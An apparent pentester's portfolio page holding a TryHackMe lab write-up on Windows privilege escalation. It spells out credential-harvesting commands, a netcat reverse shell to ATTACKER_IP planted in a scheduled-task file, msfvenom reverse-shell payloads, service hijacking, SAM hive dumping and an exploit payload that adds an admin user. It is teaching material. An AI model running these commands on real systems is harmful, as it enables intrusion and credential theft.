@@ -1,0 +1,376 @@
+<!doctype html>
+<html lang="en">
+	<head>
+		<meta charset="UTF-8" />
+		<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+		<meta
+			name="description"
+			content="HEXEN - Penetration Tester & Penetration Tester Portfolio"
+		/>
+		<title>HEXEN // CYBERPUNK PEN-TESTER PORTFOLIO</title>
+		<link rel="stylesheet" href="../assets/css/writeups.css" />
+	</head>
+
+	<body class="cyberpunk-body">
+		<!-- Matrix Rain Background -->
+		<div id="matrix-rain" class="matrix-rain"></div>
+
+		<!-- Grid Background -->
+		<div class="grid-bg fixed top-0 left-0 w-full h-full z-0"></div>
+
+		<!-- Scanlines -->
+		<div
+			class="scanlines fixed top-0 left-0 w-full h-full pointer-events-none z-0"
+		></div>
+
+		<!-- Navigation -->
+		<nav
+			class="cyber-nav fixed top-0 left-0 w-full z-50 bg-black bg-opacity-80 backdrop-blur-sm border-b border-neongreen"
+		>
+			<div class="container mx-auto px-4 py-3">
+				<div class="flex justify-between items-center">
+					<div class="cyber-logo">
+						<span
+							class="text-neongreen font-bold text-xl glitch-effect"
+							data-text="HEXEN"
+							>HEXEN</span
+						>
+						<span class="text-neonpink text-sm ml-2"
+							>// SECURITY_SPECIALIST</span
+						>
+					</div>
+
+					<!-- Desktop Menu -->
+					<div class="hidden md:flex space-x-6">
+						<a href="../" class="nav-link">HOME</a>
+						<a href="../about.html" class="nav-link">ABOUT</a>
+						<a href="../writeups.html" class="nav-link">WRITEUPS</a>
+						<a href="../blogs.html" class="nav-link">BLOGS</a>
+					</div>
+
+					<!-- Mobile Menu Button -->
+					<div class="md:hidden mt-4">
+						<button
+							id="mobile-menu-button"
+							type="button"
+							class="text-neongreen focus:outline-none"
+						>
+							<svg
+								class="h-6 w-6 transition-transform duration-300"
+								id="menu-icon"
+								fill="none"
+								viewBox="0 0 24 24"
+								stroke="currentColor"
+							>
+								<path
+									stroke-linecap="round"
+									stroke-linejoin="round"
+									stroke-width="2"
+									d="M4 6h16M4 12h16M4 18h16"
+								></path>
+							</svg>
+							<svg
+								class="h-6 w-6 transition-transform duration-300 hidden"
+								id="close-icon"
+								fill="none"
+								viewBox="0 0 24 24"
+								stroke="currentColor"
+							>
+								<path
+									stroke-linecap="round"
+									stroke-linejoin="round"
+									stroke-width="2"
+									d="M6 18L18 6M6 6l12 12"
+								></path>
+							</svg>
+						</button>
+					</div>
+				</div>
+
+				<!-- Mobile Menu (hidden by default) -->
+				<div
+					id="mobile-menu"
+					class="md:hidden mt-2 border-t border-neongreen border-opacity-30 transform origin-top transition-all duration-300 scale-y-0 opacity-0 max-h-0"
+				>
+					<div class="flex flex-col space-y-4">
+						<a href="../index.html" class="nav-link">HOME</a>
+						<a href="../about.html" class="nav-link">ABOUT</a>
+						<a href="../writeups.html" class="nav-link">WRITEUPS</a>
+						<a href="../blogs.html" class="nav-link">BLOGS</a>
+					</div>
+				</div>
+			</div>
+		</nav>
+
+		<main class="relative z-10 pt-20">
+			<section id="writeup-controls" class="px-6 pt-6 pb-2 text-center">
+  
+
+  <div id='tags-container'>
+    
+  </div>
+</section>
+
+
+<div class="series-nav">
+  <div class="series-nav-header">
+    <span class="series-label">TryHackMe Red Team Path</span>
+    <span class="series-module">Module: Post Compromise</span>
+    <span class="series-part">Part 11 / 18</span>
+  </div>
+  <div class="series-nav-dots"><span class="series-dot" title="Red Team Fundamentals (4 parts)"></span><span class="series-dot" title="Initial Access (4 parts)"></span><span class="series-dot active-module" title="Post Compromise (3 parts)"></span><span class="series-dot" title="Host Evasions (7 parts)"></span></div>
+  <div class="series-nav-links">
+    <a href="enumeration_writeup.html" class="series-nav-btn cyber-link">← enumeration</a>
+    <a href="../writeups.html" class="series-nav-btn cyber-link">↑ all writeups</a>
+    <a href="windows_internals_writeup.html" class="series-nav-btn cyber-link">[Host Evasions] windows internals →</a>
+  </div>
+</div>
+<!-- Writeup content -->
+<article class="markdown-body"><h1>Windows Privilege Escalation</h1>
+<p>Simply put, privilege escalation consists of using given access to a host with &quot;user A&quot; and leveraging it to gain access to &quot;user B&quot; by abusing a weakness in the target system. While we will usually want &quot;user B&quot; to have administrative rights, there might be situations where we&#39;ll need to escalate into other unprivileged accounts before actually gaining administrative privileges.
+Gaining access to different accounts can be as simple as finding credentials in text files or spreadsheets left unsecured by some careless user, but that won&#39;t always be the case.</p>
+<p>Depending on the situation, we might need to abuse some of the following weaknesses:</p>
+<ul>
+<li>Misconfigurations on Windows services or scheduled tasks</li>
+<li>Excessive privileges assigned to our account</li>
+<li>Vulnerable software</li>
+<li>Missing Windows security patches</li>
+</ul>
+<p><strong>Windows Users</strong>
+Windows systems mainly have two kinds of users. Depending on their access levels, we can categorize a user in one of the following groups:</p>
+<ul>
+<li>Administrators These users have the most privileges. They can change any system configuration parameter and access any file in the system.</li>
+<li>Standard Users These users can access the computer but only perform limited tasks. Typically, these users cannot make permanent or essential changes to the system and are limited to their own files.
+Any user with administrative privileges will be part of the Administrators group. Standard users are part of the Users group.</li>
+</ul>
+<p><strong>Built-in Accounts (Special)</strong>
+You will often hear about some special built-in accounts used by the operating system in the context of privilege escalation:</p>
+<ul>
+<li><strong>SYSTEM / LocalSystem</strong> An account used by the OS to perform internal tasks. It has full access to all files and resources with even higher privileges than administrators.</li>
+<li><strong>Local Service</strong> Default account used to run Windows services with minimum privileges. It uses anonymous network connections.</li>
+<li><strong>Network Service</strong> Default account used to run Windows services with minimum privileges. It uses the computer’s credentials to authenticate through the network.
+These accounts are created and managed by Windows, and you won&#39;t be able to use them like regular accounts. Still, in some situations, you may gain their privileges by exploiting specific services.</li>
+</ul>
+<p><strong>Harvesting Passwords from Usual Spots</strong>
+The easiest way to gain access to another user is to gather credentials from a compromised machine. Such credentials could exist for many reasons, including a careless user leaving them around in plaintext files, or even stored by some software like browsers or email clients.</p>
+<p>When installing Windows on a large number of hosts, administrators may use Windows Deployment Services to automate the process. These unattended installations may contain plaintext admin credentials stored in the following files:</p>
+<p>**C:\Unattend.xml  **
+**C:\Windows\Panther\Unattend.xml  **
+**C:\Windows\Panther\Unattend\Unattend.xml  **
+**C:\Windows\system32\sysprep.inf  **
+**C:\Windows\system32\sysprep\sysprep.xml  **</p>
+<p><strong>Look for XML structures like:</strong>
+<Credentials>
+<Username>Administrator</Username>
+<Domain>thm.local</Domain>
+<Password>MyPassword123</Password>
+</Credentials></p>
+<p><strong>PowerShell History</strong>
+When a user runs commands in PowerShell, they are saved in a history file. If a user runs a command that includes a password, it could be retrieved using:
+type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt</p>
+<p>This works from cmd.exe. In PowerShell, use: type $Env:userprofile\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt</p>
+<p><strong>Saved Windows Credentials</strong>
+Windows allows saving credentials for future use. To view them:
+<strong>cmdkey /list</strong></p>
+<p><strong>To try using one of the saved credentials:</strong></p>
+<p>runas /savecred /user:admin cmd.exe</p>
+<p><strong>IIS Configuration</strong>
+Internet Information Services (IIS) may contain saved credentials in its config files.
+Common locations:
+C:\inetpub\wwwroot\web.config
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config</p>
+<p><strong>To search for credentials like database connection strings:</strong>
+type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString</p>
+<p><strong>Retrieve Credentials from Software: PuTTY</strong>
+PuTTY, a popular Windows SSH client, stores session data in the registry.
+To retrieve proxy credentials:
+reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f &quot;Proxy&quot; /s</p>
+<p>Other tools that save credentials (such as web browsers, email clients, FTP clients, VNC, etc.) may have retrievable passwords via registry, config files, or GUI options.</p>
+<p>Q1:</p>
+<p>Once I had access to the system, I started by checking for any leaked credentials in the PowerShell command history. This is a common oversight by users and sometimes yields credentials used in previous commands.
+I opened a Command Prompt and ran:
+type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
+There, the password was visible for julia.jones
+Q2:Next, I pivoted to look for sensitive information in IIS configuration files. These files often contain hardcoded credentials for databases or services. I ran this command:type &quot;C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config&quot; | findstr connectionString</p>
+<p>The DB credentials are exposed within the config file as seen above.
+Q3:For this one, we run cmdkey /list to view if there’s any saved credentials associated with different users. We notice there is one for mike.katz
+To impersonate this user we use:runas /savecred /user:mike.katz cmd.exe
+This allows us to spawn a shell as mike.katzThen we navigate to this person’s desktop and find the flag in a file:THM{WHAT_IS_MY_PASSWORD}</p>
+<p>Q4:
+I targeted credentials stored in the Windows registry by the PuTTY SSH client. Specifically, PuTTY stores session information (like proxy usernames and passwords) under the following key. I ran this command:reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f &quot;Proxy&quot; /s
+From the output of this command, we can spot a user named thom.smith with a password of !Pass2021</p>
+<p><strong>Other Quick Wins</strong>
+Privilege escalation is not always a challenge. Some misconfigurations can allow you to obtain higher-privileged user access and, in some cases, even administrator access. These techniques are often more CTF-style than real-world scenarios, but if all else fails, they’re worth trying.</p>
+<p><strong>Scheduled Tasks</strong>
+By inspecting scheduled tasks, you might find one that either:</p>
+<ul>
+<li>Points to a missing binary, or</li>
+<li>Uses a binary that is writable by unprivileged users</li>
+</ul>
+<p>To** list all scheduled tasks**, use:
+<strong>schtasks</strong></p>
+<p><strong>To retrieve detailed information about a specific task:</strong>
+<strong>schtasks /query /tn vulntask /fo list /v</strong></p>
+<p>Example output:
+<strong>Task To Run:</strong> shows the binary that gets executed.
+<strong>Run As User:</strong> shows under which user the task runs.
+We now check if our user can modify the binary with icacls c:\tasks\schtask.bat</p>
+<p>Since Users have full access, we can overwrite the batch file to gain a reverse shell. Assuming nc64.exe is in C:\tools, we use this command:echo c:\tools\nc64.exe -e cmd.exe ATTACKER_IPkali 4444 &gt; C:\tasks\schtask.bat</p>
+<p><strong>AlwaysInstallElevated</strong>
+Windows .msi installer files can be forced to run with elevated privileges if specific registry keys are enabled.
+To check if the system is vulnerable, query both:
+reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
+If both keys are present and set to 1, you can exploit this by generating a malicious MSI file with msfvenom:
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_MACHINE_IP LPORT=LOCAL_PORT -f msi -o malicious.msi
+We then start a listener and run the .msi on the target:msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi</p>
+<p>This provides a reverse shell with SYSTEM privileges, provided the regkeys are properly set.</p>
+<p><strong>Abusing Service Misconfigurations</strong>
+Windows services are managed by the Service Control Manager (SCM), which is responsible for starting, stopping, and configuring services on a system. Each service runs under a specified user account and has an associated executable that SCM launches when the service starts. These service executables must implement specific functions to communicate with SCM, and not all executables are suitable to be started as services. The configuration for each service, including its executable and associated user account, is stored in the system registry.</p>
+<p><strong>Service Configuration and DACL</strong>
+The configuration details for a service, such as the binary path (the executable) and user account, can be queried using the sc qc command. For example, using the following command to query the apphostsvc service:</p>
+<p><strong>sc qc apphostsvc</strong></p>
+<p>Output will show:</p>
+<p><strong>BINARY_PATH_NAME</strong>: Path to the executable (svchost.exe -k apphost)<strong>SERVICE_START_NAME</strong>: The user account under which the service runs (e.g., localSystem)</p>
+<p>Each service has a <strong>Discretionary Access Control List (DACL)</strong>, which defines who has permission to control the service, such as starting, stopping, or reconfiguring it. These permissions can be viewed using tools like Process Hacker.</p>
+<p><strong>Services&#39; configurations and permissions</strong> are stored in the Windows registry under HKLM\SYSTEM\CurrentControlSet\Services\</p>
+<p><strong>Vulnerability from Insecure Permissions</strong>
+An attacker can exploit weak permissions on a service&#39;s executable, allowing them to replace or modify it. This vulnerability enables the attacker to run arbitrary code with the privileges of the service&#39;s user account. For example, the Splinterware System Scheduler service can be exploited due to insecure permissions on the executable file.</p>
+<p>To illustrate this, consider the following:
+<strong>Query the service configuration:</strong>
+<strong>sc qc windowsscheduler</strong></p>
+<p><strong>Check the file permissions on the executable:</strong>
+icacls C:\PROGRA<del>2\SYSTEM</del>1\WService.exe
+If the executable has Everyone with modify permissions, an attacker can replace it with a payload, such as a reverse shell, generated using msfvenom. The attacker can then execute the payload with the service&#39;s privileges by restarting the service:
+<strong>sc stop windowsscheduler</strong>
+<strong>sc start windowsscheduler</strong></p>
+<p><strong>This results in a reverse shell connection</strong> with the privileges of the service&#39;s user account (svcusr1).</p>
+<p><strong>Unquoted Service Paths</strong>
+Another common vulnerability occurs when a service&#39;s executable path is unquoted. Windows services with unquoted paths containing spaces can cause the Service Control Manager (SCM) to misinterpret the executable path. This allows attackers to place malicious executables in locations that SCM will execute before the actual service binary.
+sc qc &quot;disk sorter enterprise&quot;</p>
+<p>**Output:**<strong>BINARY_PATH_NAME</strong> : C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe</p>
+<p>In this case, due to the unquoted path, SCM might attempt to execute a file like C:\MyPrograms\Disk.exe, which could be a malicious payload placed by the attacker. If the folder containing the executable is writable, an attacker could exploit this vulnerability to gain higher privileges.</p>
+<p><strong>Insecure Service DACLs</strong>
+In addition to insecure file permissions, if the Service DACL is misconfigured, an attacker may be able to reconfigure a service to point to an arbitrary executable. By modifying the service&#39;s binPath or service account, an attacker can elevate their privileges.</p>
+<p>To check if a service&#39;s DACL allows modification, tools like AccessChk from Sysinternals can be used:
+<strong>accesschk64.exe -qlc thmservice</strong></p>
+<p>If the attacker has SERVICE_ALL_ACCESS permissions, they can change the service&#39;s executable and account, as shown below:</p>
+<p><strong>Build a reverse shell payload:</strong>
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4447 -f exe-service -o rev-svc3.exe</p>
+<p><strong>Move the payload to the target machine:</strong>
+move C:\Users\thm-unpriv\rev-svc3.exe C:\MyPrograms\Disk.exe</p>
+<p><strong>Modify the service configuration:</strong>
+sc config THMService binPath= &quot;C:\Users\thm-unpriv\rev-svc3.exe&quot; obj= LocalSystem
+Restart the service:
+sc stop THMService
+sc start THMService</p>
+<p>This results in a reverse shell with SYSTEM privileges.</p>
+<p><strong>Abusing dangerous privileges</strong>
+Windows Privileges
+Windows privileges determine the rights an account has to perform specific system tasks. These can range from simple actions, like shutting down the machine, to more critical tasks, such as bypassing access controls defined by Discretionary Access Control Lists (DACLs). For attackers, the most valuable privileges are those that allow privilege escalation.</p>
+<p>Checking Privileges
+To view the privileges assigned to a user account, the command whoami /priv can be used. Some of the privileges may be exploited to gain unauthorized access or elevate privileges. A comprehensive list of exploitable privileges is available on the Priv2Admin GitHub project.
+SeBackup / SeRestore Privileges
+The SeBackup and SeRestore privileges allow users to read and write to any file on the system, bypassing any DACLs in place. This privilege is typically granted to users in the Backup Operators group. With these privileges, an attacker can copy the SAM (Security Account Manager) and SYSTEM registry hives to extract the local Administrator&#39;s password hash, potentially escalating their privileges.</p>
+<p><strong>Exploitation steps:</strong>
+Log in with the THMBackup account, which has SeBackup and SeRestore privileges.
+Use the whoami /priv command to verify privileges.
+Backup the SAM and SYSTEM registry hives using these commands:
+reg save hklm\system C:\Users\THMBackup\system.hive
+reg save hklm\sam C:\Users\THMBackup\sam.hive</p>
+<p>Then we copy these hives to the attacker machine using SMB.Then, we use Implacket’s secretsdump.py</p>
+<p><strong>Abusing vulnerable software</strong>
+<strong>Abusing vulnerable software</strong> is a common privilege escalation technique in Windows environments. While operating systems may be patched regularly, <strong>third-party software</strong> often goes unpatched for long periods, presenting attackers with opportunities. Like vulnerable drivers, outdated software can expose <strong>elevation of privilege (EoP)</strong> paths.
+You can use <strong>WMIC</strong> to list installed software and their versions:
+<strong>wmic product get name,version,vendor</strong>
+Once you have the version information, searching vulnerability databases like <strong>Exploit-DB, Packet Storm, or even Google</strong> can reveal known exploits.</p>
+<p>Case Study – Druva inSync 6.6.3
+The target server was running <strong>Druva inSync 6.6.3</strong>, which had a <strong>privilege escalation vulnerability</strong> reported by Matteo Malvica. The flaw originated from an incomplete patch of an earlier vulnerability in <strong>version 6.5.0</strong> reported by Chris Lyne.
+The application runs an <strong>RPC (Remote Procedure Call)</strong> server on <strong>port 6064</strong> with <strong>SYSTEM privileges</strong>, accessible from <strong>localhost only</strong>. RPC allows processes to expose procedures for remote execution. In Druva’s case, <strong>procedure #5</strong> could be abused to execute <strong>any command</strong> with SYSTEM privileges.
+Originally, versions ≤ 6.5.0 had no restrictions—any command could be executed. The intended use was to run specific binaries from the path:
+*<em>C:\ProgramData\Druva\inSync4*</em></p>
+<p>However, the patch only verified that the command string started with that path. Attackers could bypass this by using** path traversal**, e.g.:
+<strong>C:\ProgramData\Druva\inSync4......\Windows\System32\cmd.exe</strong>
+This would resolve to <strong>cmd.exe in System32</strong>, bypassing the restriction.</p>
+<p>Exploit Overview
+The exploit communicates with port <strong>6064</strong> using a simple RPC protocol:
+Send a <strong>hello packet</strong> with a fixed string.
+Indicate that we want to call <strong>procedure #5</strong>.
+Send the <strong>length of the command</strong>.
+Send the <strong>command itself</strong>.</p>
+<p><strong>Practical Payload Modification</strong>
+The above default payload creates a** **<strong>pwnd</strong> user without admin rights. For privilege escalation, you can modify it to:
+<strong>$cmd = &quot;net user pwnd SimplePass123 /add &amp; net localgroup administrators pwnd /add&quot;</strong>
+This creates a user pwnd with password SimplePass123 <strong>and</strong> adds it to the <strong>Administrators</strong> group.
+Then, success can be verified using <strong>“net user pwnd”</strong> which will show the Local Group etc…
+<strong>Tools of the Trade</strong>
+Automated enumeration scripts can significantly reduce the time needed to identify potential privilege escalation vectors on Windows systems. While these tools can be powerful, it’s important to remember that automated enumeration can miss some opportunities, so manual verification remains essential.
+WinPEAS
+<strong>WinPEAS</strong> is a Windows privilege escalation enumeration tool that automates many of the manual checks discussed earlier. It runs a wide set of system commands to detect misconfigurations, vulnerable software, and escalation opportunities.
+Because its output can be <strong>lengthy and hard to read</strong>, it’s good practice to <strong>redirect the output to a file</strong> for review:
+<strong>C:&gt; winpeas.exe &gt; outputfile.txt</strong></p>
+<p>PrivescCheck
+<strong>PrivescCheck</strong> is a <strong>PowerShell-based alternative to WinPEAS</strong>. It identifies common privilege escalation vectors without requiring you to run a binary.
+If execution policy restrictions are enabled, bypass them before running:
+<strong>PS C:&gt; Set-ExecutionPolicy Bypass -Scope Process -Force</strong>
+<strong>PS C:&gt; . .\PrivescCheck.ps1</strong>
+<strong>PS C:&gt; Invoke-PrivescCheck</strong></p>
+<p>WES-NG (Windows Exploit Suggester – Next Generation)
+<strong>WES-NG</strong> is a Python-based tool that suggests potential privilege escalation exploits based on missing Windows patches. Unlike WinPEAS, it runs on your <strong>attacking machine</strong> (Kali, AttackBox, etc.) rather than on the target, helping avoid <strong>antivirus detection</strong>.
+<strong>C:&gt; systeminfo &gt; systeminfo.txt</strong>
+After running this command, transfer “systeminfo.txt” to the attacking machine.</p>
+<p>Then, update WES-NG’s vulnerability database:
+<strong>$ wes.py --update</strong>
+And finally run the analysis:
+$ wes.py systeminfo.txt</p>
+<p>Metasploit Local Exploit Suggester
+If you already have a <strong>Meterpreter session</strong>, you can use Metasploit’s built-in <strong>local_exploit_suggester</strong> to detect possible privilege escalation exploits for the current target:
+<strong>meterpreter &gt; run post/multi/recon/local_exploit_suggester</strong>
+This module checks the target’s OS version and installed patches against Metasploit’s exploit database.</p>
+</article>
+${series_nav}
+
+			<!-- Footer -->
+			<footer
+				class="cyber-footer py-12 bg-black border-t border-gray-800 mt-12"
+			>
+				<div class="container mx-auto px-4">
+					<div class="flex flex-col md:flex-row justify-between items-center">
+						<div class="mb-6 md:mb-0">
+							<h3 class="text-2xl font-bold mb-2 text-neongreen">HEXEN_SEC</h3>
+							<p class="text-sm text-gray-400 cyber-text">
+								Penetration Testing & Security Consulting
+							</p>
+						</div>
+						<div class="flex space-x-6">
+							<a
+								href="#"
+								class="hover:text-neongreen transition-colors cyber-link"
+								>Imprint</a
+							>
+							<a
+								href="#"
+								class="hover:text-neonpink transition-colors cyber-link"
+								>Privacy</a
+							>
+							<a
+								href="#"
+								class="hover:text-neonblue transition-colors cyber-link"
+								>Legal</a
+							>
+						</div>
+					</div>
+					<div
+						class="border-t border-gray-800 mt-8 pt-8 text-center text-sm text-gray-400"
+					>
+						<p class="cyber-text">
+							© 2025 HEXEN. All systems operational.
+							<span class="text-neongreen">//</span> Secure by design.
+						</p>
+					</div>
+				</div>
+			</footer>
+		</main>
+		<script type="module" src="../assets/js/menu.js" defer></script>
+	</body>
+</html>
